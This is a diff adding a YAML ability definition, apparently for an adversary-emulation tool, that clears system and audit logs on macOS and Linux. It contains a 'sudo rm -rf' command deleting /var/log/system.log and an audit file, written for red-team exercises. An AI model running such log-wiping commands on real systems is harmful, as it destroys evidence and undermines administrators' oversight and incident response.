@@ -1,0 +1,23 @@
+---
+- id: 4d4b29abb6b1e580e33c0035c1fc37ad
+  name: rm -rf
+  description: 'Delete system and audit logs
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685.006
+    name: 'Disable or Modify Tools: Clear Linux or Mac System Logs'
+  platforms:
+    darwin:
+      sh:
+        command: sudo rm -rf /var/log/system.log; if [ -d /var/audit ] ; then sudo
+          rm -rf /var/audit/20220725213300.202208110700021 ; fi
+        payloads: []
+        cleanup: ''
+    linux:
+      sh:
+        command: sudo rm -rf /var/log/system.log; if [ -d /var/audit ] ; then sudo
+          rm -rf /var/audit/20220725213300.202208110700021 ; fi
+        payloads: []
+        cleanup: ''
